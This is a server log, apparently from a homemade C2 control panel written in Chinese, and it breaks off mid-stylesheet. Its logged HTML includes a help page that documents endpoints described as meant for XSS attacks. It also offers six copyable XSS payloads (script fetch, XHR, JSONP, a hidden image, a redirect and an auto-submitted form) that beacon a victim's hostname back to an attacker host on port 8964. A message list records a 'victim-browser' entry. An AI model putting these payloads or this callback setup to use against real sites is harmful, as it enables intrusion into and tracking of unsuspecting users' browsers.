2025-06-24 17:27:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0256s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        <div class="container mt-4">\n            \n            <div class="alert alert-error alert-dismissible fade show" role="alert">\n                幫助配置文件不存在\n                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>\n            </div>\n            \n        </div>\n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    <div class="flash-messages">\n        \n        <div class="flash-message error">\n            幫助配置文件不存在\n            <button class="close-btn" onclick="this.parentElement.style.display=\'none\'">&times;</button>\n        </div>\n        \n    </div>\n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:27:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:27:14] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:27:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:27:14] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:27:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:27:14] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:28:15 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:28:15 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:28:15 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:28:15 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:28:15 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:28:15 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:28:15 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:28:15 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:28:15 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:28:17 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 17:28:17 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 17:28:17 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:28:17 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:28:17 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 17:28:17 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 17:28:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:28:17 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:28:17 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: routes/C2_control/control_help.json
2025-06-24 17:28:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:28:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:28:17] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:28:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:28:17 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:28:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0246s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        <div class="container mt-4">\n            \n            <div class="alert alert-error alert-dismissible fade show" role="alert">\n                幫助配置文件不存在\n                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>\n            </div>\n            \n        </div>\n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    <div class="flash-messages">\n        \n        <div class="flash-message error">\n            幫助配置文件不存在\n            <button class="close-btn" onclick="this.parentElement.style.display=\'none\'">&times;</button>\n        </div>\n        \n    </div>\n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:28:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:28:17] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:28:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:28:17] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:28:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:28:17] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:31:07 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:31:07 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:31:07 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:31:07 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:31:07 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:31:07 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:31:07 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:31:07 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:31:07 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:31:09 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 17:31:09 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 17:31:09 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:31:09 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:31:09 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 17:31:09 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 17:31:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:31:18 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:31:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0270s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:31:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:31:18] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:31:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:31:18] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:31:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:31:18] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:31:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:31:20 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:31:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0082s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>C2 控制面板 API 文檔</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<div class="container">\n    <h2>C2 控制面板 API 文檔</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">版本 1.0 - 完整的API使用說明</p>\n\n    <!-- API 端點列表 -->\n    <div class="help-section">\n        <h1>🚀 API 端點</h1>\n        <div class="endpoints-grid">\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge post">POST</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/add_message</code>\n                </div>\n                <p class="endpoint-description">通過表單添加控制消息</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">通過網頁表單提交</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/add_message</code>\n                </div>\n                <p class="endpoint-description">通過URL參數添加控制消息（適用於XSS攻擊）</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/add_message?message=惡意命令&amp;target_ip=192.168.1.100</code>\n                </div>\n\n                \n                <div class="xss-note">\n                    <span class="xss-badge">XSS</span>\n                    適合嵌入到 XSS 攻擊中\n                </div>\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/get_messages</code>\n                </div>\n                <p class="endpoint-description">獲取所有控制消息列表</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/get_messages</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/help</code>\n                </div>\n                <p class="endpoint-description">顯示此幫助頁面</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/help</code>\n                </div>\n\n                \n            </div>\n            \n        </div>\n    </div>\n\n    <!-- XSS 載荷範例 -->\n    <div class="help-section">\n        <h1>🔥 XSS 攻擊載荷範例</h1>\n        <div class="xss-examples">\n            \n            <div class="xss-example-card">\n                <h3>基本 XSS 載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;fetch(&#39;http://{your_ip}:8964/api/control/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;fetch(&#39;http://{your_ip}:8964/api/control/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>隱藏的圖片載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;img src=&#39;http://{your_ip}:8964/api/control/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;img src=&#39;http://{your_ip}:8964/api/control/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>JavaScript 重定向</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;window.location.href=&#39;http://{your_ip}:8964/api/control/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;window.location.href=&#39;http://{your_ip}:8964/api/control/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>Ajax 靜默攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;http://{your_ip}:8964/api/control/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;http://{your_ip}:8964/api/control/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>跨域 JSONP 攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var script=document.createElement(&#39;script&#39;);script.src=&#39;http://{your_ip}:8964/api/control/add_message?message=JSONP攻擊&amp;target_ip=&#39;+location.hostname+&#39;&amp;callback=console.log&#39;;document.head.appendChild(script);&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var script=document.createElement(&#39;script&#39;);script.src=&#39;http://{your_ip}:8964/api/control/add_message?message=JSONP攻擊&amp;target_ip=&#39;+location.hostname+&#39;&amp;callback=console.log&#39;;document.head.appendChild(script);&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>表單提交攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;form id=&#39;xss&#39; action=&#39;http://{your_ip}:8964/api/control/add_message&#39; method=&#39;GET&#39;&gt;&lt;input name=&#39;message&#39; value=&#39;表單攻擊&#39;&gt;&lt;input name=&#39;target_ip&#39; value=&#39;victim&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;xss&#39;).submit()&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;form id=&#39;xss&#39; action=&#39;http://{your_ip}:8964/api/control/add_message&#39; method=&#39;GET&#39;&gt;&lt;input name=&#39;message&#39; value=&#39;表單攻擊&#39;&gt;&lt;input name=&#39;target_ip&#39; value=&#39;victim&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;xss&#39;).submit()&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 重要提示 -->\n    <div class="help-section">\n        <h1>⚠️ 重要提示</h1>\n        <div class="notes-container">\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>⚠️ 重要：請將 {your_ip} 替換為您的實際IP地址（例如：192.168.1.100）</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>✅ 完整路徑格式：http://您的IP:8964/api/control/add_message</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🎯 GET 方式添加消息主要用於 XSS 攻擊場景</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>💾 所有消息都會被記錄到數據庫中，便於追踪攻擊來源</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🔧 target_ip 參數是可選的，可以為空或使用 location.hostname 動態獲取</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🌐 消息內容需要進行 URL 編碼以避免特殊字符問題</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>📊 所有請求都會被詳細記錄到系統日誌中</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🚫 注意跨域請求限制，某些載荷可能需要CORS設置</p>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 快速測試區域 -->\n    <div class="help-section">\n        <h1>🧪 快速測試</h1>\n        <div class="test-container">\n            <h3>測試 GET 請求添加消息:</h3>\n            <div class="test-form">\n                <input type="text" id="testMessage" placeholder="輸入測試消息" value="測試消息">\n                <input type="text" id="testIP" placeholder="輸入測試IP" value="127.0.0.1">\n                <button onclick="testGetRequest()" class="test-btn">🚀 發送測試請求</button>\n            </div>\n            <div id="testResult" class="test-result"></div>\n        </div>\n    </div>\n\n    <!-- 返回按鈕 -->\n    <div style="text-align: center; margin-top: 40px;">\n        <a href="/api/control/get_messages" class="back-btn">← 返回控制面板</a>\n    </div>\n</div>\n\n<style>\n    /* 幫助頁面專用樣式 */\n    .help-section {\n        margin: 40px 0;\n        padding: 30px;\n        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);\n        border-radius: 15px;\n        border: 1px solid rgba(102, 126, 234, 0.1);\n    }\n\n    .endpoints-grid {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .endpoint-card {\n        background: white;\n        border-radius: 12px;\n        padding: 25px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #667eea;\n        transition: all 0.3s ease;\n    }\n\n    .endpoint-card:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);\n    }\n\n    .endpoint-header {\n        display: flex;\n        align-items: center;\n        gap: 15px;\n        margin-bottom: 15px;\n    }\n\n    .method-badge {\n        padding: 5px 12px;\n        border-radius: 20px;\n        font-weight: bold;\n        font-size: 12px;\n        text-transform: uppercase;\n    }\n\n    .method-badge.get {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n    }\n\n    .method-badge.post {\n        background: linear-gradient(135deg, #007bff, #6610f2);\n        color: white;\n    }\n\n    .endpoint-path {\n        background: #f8f9fa;\n        padding: 8px 12px;\n        border-radius: 6px;\n        font-family: \'Courier New\', monospace;\n        color: #495057;\n        border: 1px solid #dee2e6;\n    }\n\n    .endpoint-description {\n        color: #6c757d;\n        font-style: italic;\n        margin-bottom: 15px;\n    }\n\n    .parameters,\n    .example {\n        margin: 15px 0;\n    }\n\n    .parameters h4,\n    .example h4 {\n        color: #495057;\n        margin-bottom: 10px;\n        font-size: 14px;\n    }\n\n    .parameters ul {\n        margin: 10px 0;\n        padding-left: 20px;\n    }\n\n    .parameters li {\n        margin: 5px 0;\n        color: #6c757d;\n    }\n\n    .example-code,\n    .payload-code {\n        background: #2d3748;\n        color: #e2e8f0;\n        padding: 12px 15px;\n        border-radius: 8px;\n        font-family: \'Courier New\', monospace;\n        display: block;\n        overflow-x: auto;\n        white-space: pre-wrap;\n        word-break: break-all;\n    }\n\n    .xss-note {\n        background: linear-gradient(135deg, #fff3cd, #ffeaa7);\n        padding: 10px 15px;\n        border-radius: 8px;\n        margin-top: 15px;\n        border: 1px solid #ffeaa7;\n    }\n\n    .xss-badge {\n        background: #dc3545;\n        color: white;\n        padding: 3px 8px;\n        border-radius: 12px;\n        font-size: 10px;\n        font-weight: bold;\n        margin-right: 8px;\n    }\n\n    .xss-examples {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .xss-example-card {\n        background: white;\n        border-radius: 12px;\n        padding: 20px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #dc3545;\n    }\n\n    .xss-example-card h3 {\n        color: #495057;\n        margin-bottom: 15px;\n        font-size: 16px;\n    }\n\n    .payload-container {\n        position: relative;\n    }\n\n    .copy-btn {\n        position: absolute;\n        top: 10px;\n        right: 10px;\n        background: #28a745;\n        color: white;\n        border: none;\n        padding: 5px 10px;\n        border-radius: 5px;\n        cursor: 